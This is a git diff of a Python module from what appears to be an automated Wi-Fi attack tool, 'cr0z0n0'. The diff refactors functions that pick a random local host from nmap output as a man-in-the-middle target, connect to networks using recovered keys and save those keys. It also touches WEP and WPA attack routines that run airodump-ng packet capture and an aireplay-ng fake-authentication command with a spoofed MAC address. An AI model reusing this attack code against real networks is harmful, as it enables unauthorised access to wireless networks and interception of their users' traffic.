@@ -25,11 +25,9 @@ Kiwi :)
 import os
 import time
 import pexpect
-import sys
 import socket
 import subprocess
 import random
-from sys import stdout
 from subprocess import Popen, call, PIPE
 from poormanslogging import info, warn, error
 
@@ -52,15 +50,9 @@ def get_target_mitm(gateway, ip_crozono):
 	nmap_report = open(OS_PATH + '/cr0z0n0_nmap', 'r')
 	for line in nmap_report:
 		if line.startswith('Nmap scan report for'):
-			ip_start = None
-			ip_start = line.find(list(filter(lambda x: str(x) in line, list(192, 172, 10)))[0])
-			if ip_start != -1:
-				targets.append(line[ip_start:60].replace(")", " ").strip())
-	if gateway in targets:
-		targets.remove(gateway)
-	if ip_crozono in targets:
-		targets.remove(ip_crozono)
-
+			ip = line.split(" ")[-1]
+			if ip.startswith(("192", "172", "10")) and ip != gateway and ip != ip_crozono:
+				targets.append(ip)
 	return random.choice(targets)
 
 
@@ -89,7 +81,7 @@ def connect(essid, key, iface_mon=None):
 		info("Connecting to '{0}' with key '{1}'".format(essid, key if key is not None else ''))
 		if iface_mon is not None:
 			call(['airmon-ng', 'stop', iface_mon], stdout=DN, stderr=DN)
-			time.sleep(1)  # TODO: Necessary? - yep for Raspbian.
+			time.sleep(1)
 
 		cmd_connect = pexpect.spawn('iwconfig {0} essid "{1}" key s:{2}'.format(iface, essid, key))
 		cmd_connect.logfile = open(LOG_FILE, 'wb')
@@ -102,7 +94,7 @@ def connect(essid, key, iface_mon=None):
 				wpa_supplicant.write('ctrl_interface=/var/run/wpa_supplicant\n')
 				wpa_supplicant.write('network={\n')
 				wpa_supplicant.write('ssid="' + essid + '"\n')
-				wpa_supplicant.write('key_mgmt=WPA-PSK\n')  # TODO: Always wpa-psk? - No problem yet.
+				wpa_supplicant.write('key_mgmt=WPA-PSK\n')
 				wpa_supplicant.write('psk="' + key.strip() + '"\n')
 				wpa_supplicant.write('}')
 				wpa_supplicant.close()
@@ -145,7 +137,6 @@ def save_key(essid, key):
 
 
 def wpa_attack(bssid, channel, iface_mon):
-	# Delete old files:
 	if os.path.exists(OS_PATH + '/cr0z0n0_attack-01.csv'):
 		os.remove(OS_PATH + '/cr0z0n0_attack-01.csv')
 		os.remove(OS_PATH + '/cr0z0n0_attack-01.cap')
@@ -216,14 +207,13 @@ def wps_check(bssid, iface_mon):
 
 
 def wep_attack(essid, bssid, channel, new_mac, iface_mon):
-	# Delete old files:
 	if os.path.exists(OS_PATH + '/cr0z0n0_attack-01.csv'):
 		os.remove(OS_PATH + '/cr0z0n0_attack-01.csv')
 		os.remove(OS_PATH + '/cr0z0n0_attack-01.cap')
 		os.remove(OS_PATH + '/cr0z0n0_attack-01.kismet.csv')
 		os.remove(OS_PATH + '/cr0z0n0_attack-01.kismet.netxml')
 
-	proc_airodump = Popen(['airodump-ng', '--bssid', bssid, '-c', channel, '-w', 'cr0z0n0_attack', iface_mon],
+	proc_airodump = subprocess.Popen(['airodump-ng', '--bssid', bssid, '-c', channel, '-w', 'cr0z0n0_attack', iface_mon],
 						stdout=DN, stderr=DN)
 
 	cmd_auth = pexpect.spawn('aireplay-ng -1 0 -e "{0}" -a {1} -h {2} {3}'.format(essid, bssid, new_mac, iface_mon))
